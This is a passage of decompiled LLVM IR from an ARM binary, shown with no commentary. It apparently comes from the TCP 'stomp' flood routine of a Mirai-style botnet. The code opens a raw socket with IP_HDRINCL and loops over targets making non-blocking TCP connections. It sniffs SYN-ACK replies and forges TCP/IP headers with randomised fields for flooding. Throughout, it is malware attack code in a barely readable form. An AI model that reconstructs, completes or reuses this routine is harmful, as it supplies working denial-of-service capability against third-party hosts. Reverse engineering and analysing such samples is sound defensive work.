  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b504 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b504, i32* %r0.global-to-local, align 4
  %v7_b508 = icmp eq i32 %v3_b504, -1
  store i1 %v7_b508, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b504, i32* @sb, align 4
  br i1 %v7_b508, label %dec_label_pc_b6f8, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b51c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b51c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b530 = call i32 @__GI_setsockopt(i32 %v3_b504, i32 0, i32 3, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v7_b534 = icmp eq i32 %v5_b530, -1
  store i1 %v7_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b534, label %dec_label_pc_b6f0, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b514
  %v0_b53c = load i32, i32* @r7, align 4
  %v3_b53c = mul i32 %v0_b53c, 65536
  store i32 %v3_b53c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b544 = load i32, i32* @r6, align 4
  %v2_b544 = icmp eq i32 %v0_b544, 0
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b54c = urem i32 %v0_b53c, 65536
  store i32 %v3_b54c, i32* @fp, align 4
  br i1 %v2_b544, label %dec_label_pc_b97c, label %dec_label_pc_b554.preheader

dec_label_pc_b554.preheader:                      ; preds = %dec_label_pc_b53c
  %v2_b5a0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b61c = ptrtoint i32* %stack_var_-80 to i32
  %v2_b628 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b62c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b68c = zext i8 %tmp to i32
  %v1_b690 = and i32 %v4_b68c, 18
  %v2_b694 = icmp eq i32 %v1_b690, 18
  %v4_b838 = sext i8 %v5_b394 to i32
  %sext = mul i32 %v5_b3b0, 16777216
  %v4_b848 = sdiv i32 %sext, 16777216
  %v3_b678 = sext i16 %tmp61 to i32
  %v1_b69c = and i32 %v4_b68c, 5
  %v2_b69c = icmp eq i32 %v1_b69c, 0
  %v4_b5dc = add i32 %v2_b5a0, 82
  %v5_b5dc = inttoptr i32 %v4_b5dc to i16*
  %v1_b7cc = add i32 %v6_b4d0, 40
  %v1_b8e0 = urem i32 %v5_b410, 2
  %tmp97 = sub nsw i32 0, %v1_b8e0
  %v4_b8e8 = and i32 %tmp97, 32
  %v1_b8f8 = urem i32 %v6_b430, 2
  %tmp98 = sub nsw i32 0, %v1_b8f8
  %v4_b900 = and i32 %tmp98, 16
  %v1_b910 = urem i32 %v6_b450, 2
  %tmp99 = sub nsw i32 0, %v1_b910
  %v4_b918 = and i32 %tmp99, 8
  %v1_b928 = urem i32 %v6_b470, 2
  %tmp100 = sub nsw i32 0, %v1_b928
  %v4_b930 = and i32 %tmp100, 4
  %v1_b940 = urem i32 %v6_b490, 2
  %tmp101 = sub nsw i32 0, %v1_b940
  %v3_b948 = and i32 %tmp101, 2
  %v1_b958 = urem i32 %v6_b4b0, 2
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b554.preheader, %dec_label_pc_b6c8
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b6c8 ], [ %tmp34, %dec_label_pc_b554.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b6c8 ], [ %tmp37, %dec_label_pc_b554.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b560 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b560, i32* %r0.global-to-local, align 4
  %v7_b564 = icmp eq i32 %v3_b560, -1
  store i1 %v7_b564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b560, i32* @r5, align 4
  br i1 %v7_b564, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b6a4
  %v0_b578 = phi i32 [ %v3_b6b8, %dec_label_pc_b6a4 ], [ %v3_b560, %dec_label_pc_b554 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b6a4 ], [ %stack_var_-62.0, %dec_label_pc_b554 ]
  %stack_var_-60.1 = phi i32 [ %v0_b778, %dec_label_pc_b6a4 ], [ %stack_var_-60.0, %dec_label_pc_b554 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b578 = call i32 @__libc_fcntl(i32 %v0_b578, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b580 = or i32 %v2_b578, 2048
  store i32 %v1_b580, i32* @r2, align 4
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v2_b588 = call i32 @__libc_fcntl(i32 %v0_b584, i32 4)
  %v3_b58c = load i32, i32* %stack_var_-44, align 4
  %v5_b594 = mul i32 %v3_b58c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b5a8 = add i32 %v5_b594, %arg2
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 20
  %v2_b5ac = inttoptr i32 %v1_b5ac to i8*
  %v3_b5ac = load i8, i8* %v2_b5ac, align 1
  %v4_b5ac = zext i8 %v3_b5ac to i32
  store i32 %v4_b5ac, i32* %r2.global-to-local, align 4
  %v2_b5b0 = icmp ugt i8 %v3_b5ac, 30
  %v7_b5b0 = icmp eq i8 %v3_b5ac, 31
  store i1 %v7_b5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_b5b4 = xor i1 %v7_b5b0, true
  %v3_b5b4 = and i1 %v2_b5b0, %v2_b5b4
  br i1 %v3_b5b4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b570
  %v5_b5b4 = add i32 %v2_b5a8, 16
  %v6_b5b4 = inttoptr i32 %v5_b5b4 to i32*
  %v7_b5b4 = load i32, i32* %v6_b5b4, align 4
  store i32 %v7_b5b4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b570, %bb
  %v4_b5b8 = phi i32 [ %v2_b5a8, %dec_label_pc_b570 ], [ %v7_b5b4, %bb ]
  %v4_b5b8.stack_var_-60.1 = select i1 %v3_b5b4, i32 %v4_b5b8, i32 %stack_var_-60.1
  %v2_b5bc = xor i1 %v2_b5b0, true
  %v3_b5bc = or i1 %v7_b5b0, %v2_b5bc
  br i1 %v3_b5bc, label %dec_label_pc_b704, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %bb71, %dec_label_pc_b704
  %v0_b778 = phi i32 [ %v5_b754, %dec_label_pc_b704 ], [ %v4_b5b8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sl, align 4
  %v9_b5c8 = icmp eq i32 %v0_b5c8, 65535
  store i1 %v9_b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5c8, label %dec_label_pc_b760, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b5c0
  %v4_b5cc = udiv i32 %v0_b5c8, 256
  %v2_b5d0 = urem i32 %v0_b5c8, 256
  store i32 %v2_b5d0, i32* %r2.global-to-local, align 4
  %v5_b5d4 = mul nuw nsw i32 %v2_b5d0, 256
  %v6_b5d4 = or i32 %v5_b5d4, %v4_b5cc
  store i32 %v6_b5d4, i32* %r3.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  %v2_b5dc = trunc i32 %v6_b5d4 to i16
  store i16 %v2_b5dc, i16* %v5_b5dc, align 2
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %.thread9, %dec_label_pc_b760
  %stack_var_-62.2 = phi i16 [ %v1_b760, %dec_label_pc_b760 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  %v3_b5f0 = call i32 @__libc_connect(i32 %v0_b5ec, i32 %v2_b5e4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b5f8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5f8, i32* @r4, align 4
  %v9_b658 = icmp eq i32 %tmp35, %v0_b778
  %v4_b680 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b658 to i32
  %v9_b66c = icmp eq i1 %v9_b658, false
  %v9_b684 = icmp eq i32 %v3_b678, %v4_b680
  br label %dec_label_pc_b614

dec_label_pc_b604:                                ; preds = %.thread, %dec_label_pc_b674, %dec_label_pc_b69c, %bb75
  %v2_b604 = call i32 @__GI_time(i32* null)
  %v0_b608 = load i32, i32* @r4, align 4
  %v2_b608 = sub i32 %v2_b604, %v0_b608
  store i32 %v2_b608, i32* %r0.global-to-local, align 4
  %v7_b60c = icmp eq i32 %v2_b608, 10
  store i1 %v7_b60c, i1* %cpsr_z.global-to-local, align 1
  %v8_b610 = icmp sgt i32 %v2_b608, 10
  br i1 %v8_b610, label %dec_label_pc_b6a4, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b604, %dec_label_pc_b5e4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b628, i32* %r1.global-to-local, align 4
  store i32 %v2_b62c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b634 = load i32, i32* @sb, align 4
  store i32 %v0_b634, i32* %r0.global-to-local, align 4
  %v6_b63c = call i32 @__libc_recvfrom(i32 %v0_b634, i32 %v2_b628, i32 256, i32 16384, i32 %v2_b61c, i32 %v2_b62c)
  store i32 %v6_b63c, i32* %r2.global-to-local, align 4
  %v7_b644 = icmp eq i32 %v6_b63c, -1
  store i1 %v7_b644, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b644, label %dec_label_pc_b6f8, label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b614
  store i32 %v0_b778, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b664 = icmp eq i32 %v6_b63c, 40
  store i1 %v7_b664, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b63c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b650
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b604

bb75:                                             ; preds = %dec_label_pc_b650
  store i1 %v9_b66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b66c, label %dec_label_pc_b604, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %bb75
  store i32 %v3_b678, i32* @lr, align 4
  store i32 %v2_b5a0, i32* @r3, align 4
  store i32 %v4_b680, i32* %r2.global-to-local, align 4
  store i1 %v9_b684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b684, label %dec_label_pc_b68c, label %dec_label_pc_b604

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674
  store i32 %v4_b68c, i32* %r2.global-to-local, align 4
  store i32 %v1_b690, i32* @r3, align 4
  store i1 %v2_b694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b694, label %dec_label_pc_b770, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b68c
  store i1 %v2_b69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b69c, label %dec_label_pc_b604, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b604
  %v0_b6a4 = load i32, i32* @r5, align 4
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__GI___libc_close(i32 %v0_b6a4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b6b8, i32* %r0.global-to-local, align 4
  %v3_b6bc = icmp eq i32 %v3_b6b8, -1
  %v8_b6bc = icmp eq i32 %v3_b6b8, -1
  store i1 %v8_b6bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6b8, i32* @r5, align 4
  br i1 %v3_b6bc, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b554, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b554 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b6a4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b554 ], [ %v0_b778, %bb82 ], [ %v0_b778, %dec_label_pc_b6a4 ]
  %v3_b6c8 = load i32, i32* %stack_var_-44, align 4
  %v1_b6cc = add i32 %v3_b6c8, 1
  store i32 %v1_b6cc, i32* @r3, align 4
  %v1_b6d0 = load i32, i32* @r6, align 4
  %v9_b6d0 = icmp eq i32 %v1_b6cc, %v1_b6d0
  store i1 %v9_b6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b6cc, i32* %stack_var_-44, align 4
  %v5_b6d8 = icmp slt i32 %v1_b6cc, %v1_b6d0
  br i1 %v5_b6d8, label %dec_label_pc_b554, label %dec_label_pc_b6dc

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6c8
  store i32 %v6_b4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b98c

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b514
  %v0_b6f0 = load i32, i32* @sb, align 4
  store i32 %v0_b6f0, i32* %r0.global-to-local, align 4
  %v1_b6f4 = call i32 @__GI___libc_close(i32 %v0_b6f0)
  store i32 %v1_b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b614, %entry, %dec_label_pc_b6f0
  %v1_b700 = phi i32 [ %v3_b504, %entry ], [ %v1_b6f4, %dec_label_pc_b6f0 ], [ 0, %dec_label_pc_b614 ]
  store i32 %v27_b330, i32* %lr.global-to-local, align 4
  ret i32 %v1_b700

dec_label_pc_b704:                                ; preds = %bb71
  %v1_b704 = add i32 %v4_b5b8, 16
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* @r4, align 4
  %v0_b708 = call i32 @rand_next()
  store i32 %v0_b708, i32* %r0.global-to-local, align 4
  %v3_b70c = load i32, i32* %stack_var_-44, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  %v0_b71c = load i32, i32* @r4, align 4
  %v1_b71c = and i32 %v0_b71c, 16711680
  store i32 %v1_b71c, i32* %ip.global-to-local, align 4
  %v3_b720 = udiv i32 %v0_b71c, 16777216
  %v2_b724 = add i32 %v5_b714, %arg2
  store i32 %v2_b724, i32* %r1.global-to-local, align 4
  %v4_b728 = udiv i32 %v1_b71c, 256
  %v5_b728 = or i32 %v4_b728, %v3_b720
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b72c = and i32 %v0_b71c, 65280
  store i32 %v1_b72c, i32* %r3.global-to-local, align 4
  %v1_b730 = add i32 %v2_b724, 20
  %v2_b730 = inttoptr i32 %v1_b730 to i8*
  %v3_b730 = load i8, i8* %v2_b730, align 1
  %v4_b730 = zext i8 %v3_b730 to i32
  store i32 %v4_b730, i32* %ip.global-to-local, align 4
  %v5_b738 = call i32 @llvm.bswap.i32(i32 %v0_b71c)
  %v7_b73c = lshr i32 %v0_b708, %v4_b730
  %v8_b73c = add i32 %v7_b73c, %v5_b738
  store i32 %v8_b73c, i32* %r2.global-to-local, align 4
  %v1_b740 = and i32 %v8_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  %v1_b74c = and i32 %v8_b73c, 65280
  store i32 %v1_b74c, i32* %r1.global-to-local, align 4
  %v5_b754 = call i32 @llvm.bswap.i32(i32 %v8_b73c)
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b5c0

dec_label_pc_b760:                                ; preds = %dec_label_pc_b5c0
  %v0_b760 = call i32 @rand_next()
  %v1_b760 = trunc i32 %v0_b760 to i16
  store i32 %v0_b760, i32* %r0.global-to-local, align 4
  store i32 %v2_b5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b68c
  %v3_b770 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b770, i32* @r4, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v5_b778 = mul i32 %v3_b770, 16
  %v6_b778 = add i32 %v5_b778, %v2_b34c
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  store i32 %v0_b778, i32* %v7_b778, align 4
  %v0_b77c = load i32, i32* @r8, align 4
  %v1_b77c = add i32 %v0_b77c, 4
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r1.global-to-local, align 4
  %v1_b788 = and i32 %v3_b77c, 65280
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  store i32 %v2_b34c, i32* %r0.global-to-local, align 4
  %v0_b798 = load i32, i32* @r4, align 4
  %v3_b798 = mul i32 %v0_b798, 16
  %v2_b79c = add i32 %v3_b798, %v2_b34c
  store i32 %v2_b79c, i32* %ip.global-to-local, align 4
  %v5_b7a0 = call i32 @llvm.bswap.i32(i32 %v3_b77c)
  store i32 %v5_b7a0, i32* %r3.global-to-local, align 4
  %v2_b7a4 = add i32 %v2_b79c, 4
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v5_b7a0, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* @r8, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  %v2_b7a8 = inttoptr i32 %v1_b7a8 to i32*
  %v3_b7a8 = load i32, i32* %v2_b7a8, align 4
  store i32 %v3_b7a8, i32* %r1.global-to-local, align 4
  %v1_b7ac = and i32 %v3_b7a8, 16711680
  store i32 %v1_b7ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r2.global-to-local, align 4
  %v5_b7c4 = call i32 @llvm.bswap.i32(i32 %v3_b7a8)
  store i32 %v5_b7c4, i32* %r3.global-to-local, align 4
  %v1_b7c8 = add i32 %v0_b7a8, 2
  %v2_b7c8 = inttoptr i32 %v1_b7c8 to i16*
  %v3_b7c8 = load i16, i16* %v2_b7c8, align 2
  %v4_b7c8 = zext i16 %v3_b7c8 to i32
  store i32 %v4_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b7cc, i32* @r7, align 4
  %v0_b7d0 = load i32, i32* @lr, align 4
  %v1_b7d0 = trunc i32 %v0_b7d0 to i16
  %v2_b7d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 14
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i16*
  store i16 %v1_b7d0, i16* %v4_b7d0, align 2
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 12
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = add i32 %v1_b7d8, 8
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v0_b7d8, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* @r7, align 4
  store i32 %v0_b7dc, i32* %r0.global-to-local, align 4
  %v1_b7e0 = call i32 @malloc(i32 %v0_b7dc)
  store i32 %v1_b7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* @r4, align 4
  %v5_b7ec = mul i32 %v2_b7ec, 4
  %v6_b7ec = add i32 %v5_b7ec, %v2_b35c
  %v7_b7ec = inttoptr i32 %v6_b7ec to i32*
  store i32 %v1_b7e0, i32* %v7_b7ec, align 4
  %v3_b7f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7f0, i32* %r2.global-to-local, align 4
  %v0_b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7f4 = mul i32 %v3_b7f0, 4
  %v5_b7f4 = add i32 %v0_b7f4, %v4_b7f4
  %v6_b7f4 = inttoptr i32 %v5_b7f4 to i32*
  %v7_b7f4 = load i32, i32* %v6_b7f4, align 4
  store i32 %v7_b7f4, i32* @r4, align 4
  %v1_b7f8 = inttoptr i32 %v7_b7f4 to i8*
  %v2_b7f8 = load i8, i8* %v1_b7f8, align 1
  %tmp103 = urem i8 %v2_b7f8, 16
  %v1_b7fc = zext i8 %tmp103 to i32
  %v1_b800 = or i32 %v1_b7fc, 64
  store i32 %v1_b800, i32* %r3.global-to-local, align 4
  %v1_b804 = trunc i32 %v1_b800 to i8
  store i8 %v1_b804, i8* %v1_b7f8, align 1
  %v0_b808 = load i32, i32* @r4, align 4
  %v1_b808 = inttoptr i32 %v0_b808 to i8*
  %v2_b808 = load i8, i8* %v1_b808, align 1
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b80c, 256
  %v1_b814 = and i8 %v2_b808, -16
  %v1_b818 = or i8 %v1_b814, 5
  %v1_b81c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b80c, 256
  %v4_b820 = urem i32 %tmp78, 256
  %v5_b820 = or i32 %v4_b820, %v1_b81c
  store i32 %v5_b820, i32* %r2.global-to-local, align 4
  %v0_b824 = load i32, i32* @fp, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r0.global-to-local, align 4
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  %v3_b82c = udiv i32 %v0_b824, 256
  store i32 %v3_b82c, i32* %r1.global-to-local, align 4
  store i8 %v1_b818, i8* %v1_b808, align 1
  %v0_b834 = load i32, i32* %r1.global-to-local, align 4
  %v1_b834 = load i32, i32* %r0.global-to-local, align 4
  %v4_b834 = mul i32 %v1_b834, 256
  %v5_b834 = or i32 %v4_b834, %v0_b834
  store i32 %v5_b834, i32* %r1.global-to-local, align 4
  store i32 %v4_b838, i32* %r0.global-to-local, align 4
  %v2_b83c = load i32, i32* @r4, align 4
  %v3_b83c = add i32 %v2_b83c, 1
  %v4_b83c = inttoptr i32 %v3_b83c to i8*
  store i8 %v5_b394, i8* %v4_b83c, align 1
  %v0_b840 = load i32, i32* %r1.global-to-local, align 4
  %v1_b840 = trunc i32 %v0_b840 to i16
  %v2_b840 = load i32, i32* @r4, align 4
  %v3_b840 = add i32 %v2_b840, 4
  %v4_b840 = inttoptr i32 %v3_b840 to i16*
  store i16 %v1_b840, i16* %v4_b840, align 2
  %v0_b844 = load i32, i32* %ip.global-to-local, align 4
  %v2_b844 = icmp eq i32 %v0_b844, 0
  store i1 %v2_b844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b848, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* %r2.global-to-local, align 4
  %v1_b84c = trunc i32 %v0_b84c to i16
  %v2_b84c = load i32, i32* @r4, align 4
  %v3_b84c = add i32 %v2_b84c, 2
  %v4_b84c = inttoptr i32 %v3_b84c to i16*
  store i16 %v1_b84c, i16* %v4_b84c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b844, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b770
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b770, %bb79
  %v0_b858 = load i32, i32* %r1.global-to-local, align 4
  %v1_b858 = trunc i32 %v0_b858 to i8
  %v2_b858 = load i32, i32* @r4, align 4
  %v3_b858 = add i32 %v2_b858, 8
  %v4_b858 = inttoptr i32 %v3_b858 to i8*
  store i8 %v1_b858, i8* %v4_b858, align 1
  %v0_b85c = load i32, i32* %r3.global-to-local, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v2_b85c = load i32, i32* @r4, align 4
  %v3_b85c = add i32 %v2_b85c, 9
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b860, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b860 = load i32, i32* %r2.global-to-local, align 4
  %v2_b860 = trunc i32 %v1_b860 to i16
  %v3_b860 = load i32, i32* @r4, align 4
  %v4_b860 = add i32 %v3_b860, 6
  %v5_b860 = inttoptr i32 %v4_b860 to i16*
  store i16 %v2_b860, i16* %v5_b860, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32* %r2.global-to-local, align 4
  %v2_b868 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_b868, i32* %r1.global-to-local, align 4
  %v1_b86c = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b86c, 12
  %v3_b86c = inttoptr i32 %v2_b86c to i32*
  store i32 %v2_b868, i32* %v3_b86c, align 4
  %v3_b870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b870, i32* %r3.global-to-local, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v4_b878 = mul i32 %v3_b870, 16
  %v5_b878 = add i32 %v4_b878, %v2_b34c
  %v6_b878 = inttoptr i32 %v5_b878 to i32*
  %v7_b878 = load i32, i32* %v6_b878, align 4
  store i32 %v7_b878, i32* %r2.global-to-local, align 4
  store i32 %v5_b878, i32* %r3.global-to-local, align 4
  %v1_b884 = load i32, i32* @r4, align 4
  %v2_b884 = add i32 %v1_b884, 16
  %v3_b884 = inttoptr i32 %v2_b884 to i32*
  store i32 %v7_b878, i32* %v3_b884, align 4
  %v0_b888 = load i32, i32* %r3.global-to-local, align 4
  %v1_b888 = add i32 %v0_b888, 12
  %v2_b888 = inttoptr i32 %v1_b888 to i16*
  %v3_b888 = load i16, i16* %v2_b888, align 2
  %v4_b888 = zext i16 %v3_b888 to i32
  store i32 %v4_b888, i32* %r0.global-to-local, align 4
  %v1_b88c = add i32 %v0_b888, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r1.global-to-local, align 4
  %v2_b890 = load i32, i32* @r4, align 4
  %v3_b890 = add i32 %v2_b890, 20
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b888, i16* %v4_b890, align 2
  %v0_b894 = load i32, i32* @r4, align 4
  %v1_b894 = add i32 %v0_b894, 20
  store i32 %v1_b894, i32* @r8, align 4
  %v1_b898 = add i32 %v0_b894, 33
  %v2_b898 = inttoptr i32 %v1_b898 to i8*
  %v3_b898 = load i8, i8* %v2_b898, align 1
  %v4_b898 = zext i8 %v3_b898 to i32
  store i32 %v4_b898, i32* %r2.global-to-local, align 4
  %v0_b89c = load i32, i32* %r1.global-to-local, align 4
  %v2_b89c = add i32 %v0_b894, 24
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a0 = or i32 %v0_b8a0, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v0_b8a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 4
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  store i32 %v3_b8a4, i32* %r1.global-to-local, align 4
  %v1_b8a8 = add i32 %v0_b8a4, 14
  %v2_b8a8 = inttoptr i32 %v1_b8a8 to i16*
  %v3_b8a8 = load i16, i16* %v2_b8a8, align 2
  %v4_b8a8 = zext i16 %v3_b8a8 to i32
